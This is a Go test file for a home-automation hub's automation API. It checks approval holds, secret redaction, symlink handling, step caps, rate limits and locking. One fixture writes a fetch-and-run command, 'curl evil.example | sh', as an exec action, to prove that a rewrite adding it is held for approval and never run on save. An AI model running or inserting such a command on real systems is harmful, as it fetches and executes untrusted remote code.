// SPDX-License-Identifier: AGPL-3.0-only

package hub

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"maps"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gvart/hearth/internal/automation"
	"github.com/gvart/hearth/internal/policy"
	"github.com/gvart/hearth/internal/store"
)

const nightlyLogYAML = `id: nightly
triggers:
  - type: manual
actions:
  - type: log
    message: hi
`

const nightlyExecYAML = `id: nightly
triggers:
  - type: manual
actions:
  - id: own-it
    type: exec
    device: pi4
    command: [/bin/sh, -c, "curl evil.example | sh"]
`

var grantNightly = policy.Config{DangerousAutomations: []string{"nightly"}}

// TestGrantedAutomationRewriteIsHeld: a grant belongs to an id, so whoever
// rewrites that file inherits it unless someone approves the new content.
func TestGrantedAutomationRewriteIsHeld(t *testing.T) {
	revision := automation.Revision([]byte(nightlyLogYAML))

	t.Run("update is held until approved", func(t *testing.T) {
		f := newAutomationFixture(t, grantNightly)
		f.write(t, "nightly.yaml", nightlyLogYAML)
		id, done := heldSave(t, f, http.MethodPut, "/api/v1/automations/nightly", saveBody(t, nightlyExecYAML, revision))
		if got := f.read(t, "nightly.yaml"); got != nightlyLogYAML {
			t.Fatalf("written before approval:\n%s", got)
		}
		if err := f.api.policy.Decide(t.Context(), policy.ActorAdmin, "op", id, true, reauthed); err != nil {
			t.Fatal(err)
		}
		if resp := <-done; resp.StatusCode != http.StatusOK {
			t.Fatalf("status %d: %s", resp.StatusCode, resp.body)
		}
		if got := f.read(t, "nightly.yaml"); got != nightlyExecYAML {
			t.Errorf("not written after approval:\n%s", got)
		}
		if n := f.agents.execs.Load(); n != 0 {
			t.Errorf("saving ran the command %d times", n)
		}
	})

	t.Run("update denied by the approver", func(t *testing.T) {
		f := newAutomationFixture(t, grantNightly)
		f.write(t, "nightly.yaml", nightlyLogYAML)
		id, done := heldSave(t, f, http.MethodPut, "/api/v1/automations/nightly", saveBody(t, nightlyExecYAML, revision))
		if err := f.api.policy.Decide(t.Context(), policy.ActorAdmin, "op", id, false, nil); err != nil {
			t.Fatal(err)
		}
		if resp := <-done; resp.StatusCode != http.StatusForbidden {
			t.Fatalf("status %d, want 403: %s", resp.StatusCode, resp.body)
		}
		if got := f.read(t, "nightly.yaml"); got != nightlyLogYAML {
			t.Errorf("written after a denial:\n%s", got)
		}
	})

	t.Run("create under a granted id is held", func(t *testing.T) {
		f := newAutomationFixture(t, grantNightly)
		id, done := heldSave(t, f, http.MethodPost, "/api/v1/automations", saveBody(t, nightlyExecYAML, ""))
		if got := f.files(t); len(got) != 0 {
			t.Fatalf("written before approval: %v", got)
		}
		if err := f.api.policy.Decide(t.Context(), policy.ActorAdmin, "op", id, false, nil); err != nil {
			t.Fatal(err)
		}
		if resp := <-done; resp.StatusCode != http.StatusForbidden {
			t.Fatalf("status %d, want 403: %s", resp.StatusCode, resp.body)
		}
		if got := f.files(t); len(got) != 0 {
			t.Errorf("written after a denial: %v", got)
		}
	})

	t.Run("renaming into or out of a granted id is refused", func(t *testing.T) {
		f := newAutomationFixture(t, grantNightly)
		other := strings.ReplaceAll(nightlyLogYAML, "nightly", "other")
		f.write(t, "other.yaml", other)
		f.write(t, "nightly.yaml", nightlyLogYAML)
		for path, body := range map[string]string{
			"/api/v1/automations/other": saveBody(t, nightlyExecYAML, automation.Revision([]byte(other))),
			"/api/v1/automations/nightly": saveBody(t, strings.ReplaceAll(nightlyExecYAML, "nightly", "other"),
				revision),
		} {
			if resp := f.do(t, http.MethodPut, path, body, f.cookie); resp.StatusCode != http.StatusBadRequest {
				t.Errorf("PUT %s: status %d, want 400: %s", path, resp.StatusCode, resp.body)
			}
		}
		if f.read(t, "other.yaml") != other || f.read(t, "nightly.yaml") != nightlyLogYAML {
			t.Error("a rename changed a file")
		}
	})

	t.Run("refused when the hub cannot hold approvals", func(t *testing.T) {
		f := newAutomationFixtureWith(t, func(st *store.Store) *policy.Engine {
			return policy.NewWithConfig(st.Audit(), nil, grantNightly)
		})
		f.write(t, "nightly.yaml", nightlyLogYAML)
		resp := f.do(t, http.MethodPut, "/api/v1/automations/nightly", saveBody(t, nightlyExecYAML, revision), f.cookie)
		if resp.StatusCode != http.StatusForbidden {
			t.Fatalf("status %d, want 403: %s", resp.StatusCode, resp.body)
		}
		if got := f.read(t, "nightly.yaml"); got != nightlyLogYAML {
			t.Errorf("written without an approval:\n%s", got)
		}
	})

	t.Run("a configured denial stays a denial", func(t *testing.T) {
		cfg := grantNightly
		cfg.Actors = map[string]map[policy.Class]policy.Mode{policy.ActorWeb: {policy.Dangerous: policy.ModeDeny}}
		f := newAutomationFixture(t, cfg)
		f.write(t, "nightly.yaml", nightlyLogYAML)
		resp := f.do(t, http.MethodPut, "/api/v1/automations/nightly", saveBody(t, nightlyExecYAML, revision), f.cookie)
		if resp.StatusCode != http.StatusForbidden {
			t.Fatalf("status %d, want 403: %s", resp.StatusCode, resp.body)
		}
	})

	t.Run("the dry run says it would be held", func(t *testing.T) {
		f := newAutomationFixture(t, grantNightly)
		if out := dryRun(t, f, nightlyExecYAML); out.Save == nil || out.Save.Decision != policy.Confirm {
			t.Errorf("save decision %+v, want confirm", out.Save)
		}
	})

	for name, tc := range map[string]struct {
		cfg  policy.Config
		yaml string
	}{
		"a granted id without a dangerous action": {grantNightly, strings.Replace(nightlyLogYAML, "hi", "bye", 1)},
		"a dangerous action without a grant":      {policy.Config{}, nightlyExecYAML},
	} {
		t.Run(name+" is not held", func(t *testing.T) {
			f := newAutomationFixture(t, tc.cfg)
			f.write(t, "nightly.yaml", nightlyLogYAML)
			resp := f.do(t, http.MethodPut, "/api/v1/automations/nightly", saveBody(t, tc.yaml, revision), f.cookie)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status %d: %s", resp.StatusCode, resp.body)
			}
		})
	}
}

// TestApproverSeesThePlan: what is approved must be visible, and secrets must
// stay out of the approval and the audit log.
func TestApproverSeesThePlan(t *testing.T) {
	cfg := policy.Config{Actors: map[string]map[policy.Class]policy.Mode{policy.ActorWeb: {policy.Dangerous: policy.ModeConfirm}}}
	f := newAutomationFixture(t, cfg)
	//nolint:gosec // G101: made-up secrets, which the test looks for.
	yaml := `id: planned
triggers:
  - type: manual
  - id: probe
    type: http
    url: https://user:trigger-s3cret@status.example/health?token=trigger-s3cret
actions:
  - id: run-it
    type: exec
    device: pi4
    command: [/usr/bin/touch, /tmp/visible-to-approver]
  - id: call
    type: webhook
    url: https://user:url-s3cret@hooks.example/path-s3cret?token=query-s3cret
    headers:
      Authorization: Bearer header-s3cret
    body: body-s3cret
`
	id, done := heldSave(t, f, http.MethodPost, "/api/v1/automations", saveBody(t, yaml, ""))
	held, err := f.st.Approvals().Get(t.Context(), id)
	if err != nil {
		t.Fatal(err)
	}
	var detail struct {
		Plan string `json:"plan"`
	}
	if err := json.Unmarshal(held.Detail, &detail); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"/usr/bin/touch", "/tmp/visible-to-approver", "pi4", "https://hooks.example"} {
		if !strings.Contains(detail.Plan, want) {
			t.Errorf("the plan lacks %q:\n%s", want, detail.Plan)
		}
	}
	if err := f.api.policy.Decide(t.Context(), policy.ActorAdmin, "op", id, false, nil); err != nil {
		t.Fatal(err)
	}
	<-done
	for name, text := range map[string]string{"approval": string(held.Detail), "audit": auditText(t, f)} {
		if strings.Contains(text, "s3cret") {
			t.Errorf("the %s holds a secret: %s", name, text)
		}
	}
}

func auditText(t *testing.T, f *automationFixture) string {
	t.Helper()
	var b strings.Builder
	for _, e := range f.applyAudit(t) {
		b.Write(e.Detail)
	}
	return b.String()
}

type failingAudit struct{}

func (failingAudit) Append(context.Context, store.AuditEntry) (int64, error) {
	return 0, errors.New("audit log unavailable")
}

// TestAutomationSaveNeedsItsAuditEntry: a save the audit log cannot record
// must not reach the disk.
func TestAutomationSaveNeedsItsAuditEntry(t *testing.T) {
	f := newAutomationFixtureWith(t, func(st *store.Store) *policy.Engine {
		return policy.NewWithConfig(failingAudit{}, st.Approvals(), policy.Config{})
	})
	resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, helloYAML, ""), f.cookie)
	if resp.StatusCode == http.StatusCreated {
		t.Errorf("status %d, want a failure", resp.StatusCode)
	}
	if got := f.files(t); len(got) != 0 {
		t.Errorf("a save with no audit entry wrote %v", got)
	}
}

// TestDeniedRequestsAreNotParsed: a template costs nothing to someone policy
// refuses, because the file is not read at all.
func TestDeniedRequestsAreNotParsed(t *testing.T) {
	deny := policy.Config{Actors: map[string]map[policy.Class]policy.Mode{policy.ActorWeb: {policy.Dangerous: policy.ModeDeny}}}
	f := newAutomationFixture(t, deny)
	// Invalid on purpose: answering 422 would prove it was parsed.
	resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, "id: [", ""), f.cookie)
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("save: status %d, want 403: %s", resp.StatusCode, resp.body)
	}
	out := dryRun(t, f, "id: [")
	if out.Valid || len(out.Problems) != 0 || out.Save == nil || out.Save.Decision != policy.Deny {
		t.Errorf("dry run answered %+v, want a denial without parsing", out)
	}
}

func TestUnboundedTemplateIsRefused(t *testing.T) {
	f := newAutomationFixture(t, policy.Config{})
	yaml := "id: a\ntriggers: [{type: manual}]\nactions: [{type: log, message: '{{range 2000000}}xxxxxxxxxx{{end}}'}]\n"
	resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, yaml, ""), f.cookie)
	if resp.StatusCode != http.StatusUnprocessableEntity {
		t.Errorf("status %d, want 422: %s", resp.StatusCode, resp.body)
	}
}

func manySteps(n int) string {
	var b strings.Builder
	b.WriteString("id: many\ntriggers:\n  - type: manual\nactions:\n")
	for i := range n {
		fmt.Fprintf(&b, "  - {id: s%d, type: log, message: hi}\n", i)
	}
	return b.String()
}

func TestAutomationStepsAreCapped(t *testing.T) {
	f := newAutomationFixture(t, policy.Config{})
	yaml := manySteps(maxAutomationSteps)
	resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, yaml, ""), f.cookie)
	if resp.StatusCode != http.StatusUnprocessableEntity {
		t.Errorf("save: status %d, want 422: %s", resp.StatusCode, resp.body)
	}
	if out := dryRun(t, f, yaml); out.Valid || len(out.Problems) == 0 || len(out.Actions) != 0 {
		t.Errorf("dry run answered %+v", out)
	}
	entries, err := f.st.Audit().List(t.Context(), 10)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Errorf("a file over the cap reached the audit log: %d entries", len(entries))
	}
	ok := manySteps(maxAutomationSteps - 1)
	if out := dryRun(t, f, ok); !out.Valid {
		t.Errorf("a file at the cap was refused: %+v", out.Problems)
	}
}

func TestDryRunIsRateLimited(t *testing.T) {
	f := newAutomationFixture(t, policy.Config{})
	limited := false
	for range dryRunBurst + 1 {
		resp := f.do(t, http.MethodPost, "/api/v1/automations/dry-run", saveBody(t, helloYAML, ""), f.cookie)
		if resp.StatusCode == http.StatusTooManyRequests {
			limited = true
			if resp.Header.Get("Retry-After") == "" {
				t.Error("429 without Retry-After")
			}
		}
	}
	if !limited {
		t.Errorf("%d dry runs in a row were all answered", dryRunBurst+1)
	}
}

func TestDryRunBlockedHidesPaths(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("root reads unreadable files")
	}
	f := newAutomationFixture(t, policy.Config{})
	f.write(t, "locked.yaml", helloYAML)
	if err := os.Chmod(filepath.Join(f.dir, "locked.yaml"), 0); err != nil {
		t.Fatal(err)
	}
	out := dryRun(t, f, strings.ReplaceAll(helloYAML, "hello", "other"))
	if out.Blocked == "" {
		t.Fatalf("dry run answered %+v, want it blocked", out)
	}
	if strings.Contains(out.Blocked, f.dir) || strings.Contains(out.Blocked, "permission") {
		t.Errorf("blocked shows the raw error: %q", out.Blocked)
	}
}

func TestAutomationLinksAreNotRead(t *testing.T) {
	const outsideFile = "id: outside\ndescription: outside-s3cret\ntriggers: [{type: manual}]\nactions: [{type: log, message: hi}]\n"
	f := newAutomationFixture(t, policy.Config{})
	target := filepath.Join(t.TempDir(), "outside.yaml")
	if err := os.WriteFile(target, []byte(outsideFile), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(f.dir, "outside.yaml")); err != nil {
		t.Fatal(err)
	}

	get := f.do(t, http.MethodGet, "/api/v1/automations/outside", "", f.cookie)
	if get.StatusCode != http.StatusConflict {
		t.Errorf("get: status %d, want 409: %s", get.StatusCode, get.body)
	}
	list := f.do(t, http.MethodGet, "/api/v1/automations", "", f.cookie)
	if list.StatusCode != http.StatusOK {
		t.Fatalf("list: status %d: %s", list.StatusCode, list.body)
	}
	for name, body := range map[string][]byte{"get": get.body, "list": list.body} {
		if strings.Contains(string(body), "s3cret") {
			t.Errorf("%s shows the link's target: %s", name, body)
		}
	}

	// An operator's linked file is no reason to refuse other saves.
	resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, helloYAML, ""), f.cookie)
	if resp.StatusCode != http.StatusCreated {
		t.Errorf("save next to a link: status %d: %s", resp.StatusCode, resp.body)
	}
}

type followerLeadership struct{ leader bool }

func (l followerLeadership) IsLeader() bool       { return l.leader }
func (followerLeadership) LeaderAgentURL() string { return "https://hub-a:8443" }
func (followerLeadership) AgentURLs() []string {
	return []string{"https://hub-a:8443", "https://hub-b:8443"}
}

func TestSaveSaysWhichHubHoldsTheFile(t *testing.T) {
	for _, tc := range []struct {
		name            string
		lead            Leadership
		cluster, leader bool
	}{
		{"single hub", nil, false, true},
		{"cluster leader", followerLeadership{leader: true}, true, true},
		{"cluster follower", followerLeadership{}, true, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newAutomationFixture(t, policy.Config{})
			if tc.lead != nil {
				f.api.leadership = tc.lead
			}
			resp := f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, helloYAML, ""), f.cookie)
			if resp.StatusCode != http.StatusCreated {
				t.Fatalf("status %d: %s", resp.StatusCode, resp.body)
			}
			var got struct {
				Hub     string `json:"hub"`
				Cluster bool   `json:"cluster"`
				Leader  bool   `json:"leader"`
			}
			if err := json.Unmarshal(resp.body, &got); err != nil {
				t.Fatal(err)
			}
			if got.Hub == "" || got.Cluster != tc.cluster || got.Leader != tc.leader {
				t.Errorf("answered %+v, want cluster %v, leader %v and the hub's address", got, tc.cluster, tc.leader)
			}
		})
	}
}

// newAutomationFixtureWith is newAutomationFixture with its own policy engine.
func newAutomationFixtureWith(t *testing.T, engine func(*store.Store) *policy.Engine) *automationFixture {
	t.Helper()
	st := newTestStore(t)
	log := slog.New(slog.DiscardHandler)
	agents, notifier := &spyAgents{}, &spyNotifier{}
	kinds := automation.Builtin(log)
	maps.Copy(kinds.Triggers, automation.Triggers(automation.TriggerDeps{}))
	maps.Copy(kinds.Actions, automation.Actions(automation.ActionDeps{Agents: agents, Notifier: notifier}))
	dir := filepath.Join(t.TempDir(), "automations")
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	a := newAPI(Config{
		Store: st, Policy: engine(st), Log: log, Registry: NewRegistry(RegistryConfig{Store: st, Log: log}),
		AutomationsDir: dir, AutomationKinds: kinds,
	})
	srv := httptest.NewServer(a.routes())
	t.Cleanup(srv.Close)
	if err := st.Admin().CreateSession(t.Context(), "auto-session", time.Now(), time.Now().Add(time.Hour)); err != nil {
		t.Fatal(err)
	}
	return &automationFixture{
		apiFixture: &apiFixture{api: a, srv: srv, st: st}, dir: dir, cookie: testCookie("auto-session"),
		agents: agents, notifier: notifier,
	}
}

// TestSaveUsesTheSharedLock: MCP's apply_automation writes the same directory
// under the lock the hub is given, so a web save waits for it.
func TestSaveUsesTheSharedLock(t *testing.T) {
	f := newAutomationFixture(t, policy.Config{})
	var lock sync.Mutex
	f.api.automationsMu = &lock
	lock.Lock()
	done := make(chan apiResp, 1)
	go func() { done <- f.do(t, http.MethodPost, "/api/v1/automations", saveBody(t, helloYAML, ""), f.cookie) }()
	select {
	case resp := <-done:
		t.Fatalf("the save did not wait for the shared lock: %d %s", resp.StatusCode, resp.body)
	case <-time.After(300 * time.Millisecond):
	}
	if files := f.files(t); len(files) != 0 {
		t.Fatalf("written while the lock was held: %v", files)
	}
	lock.Unlock()
	if resp := <-done; resp.StatusCode != http.StatusCreated {
		t.Fatalf("status %d: %s", resp.StatusCode, resp.body)
	}
}
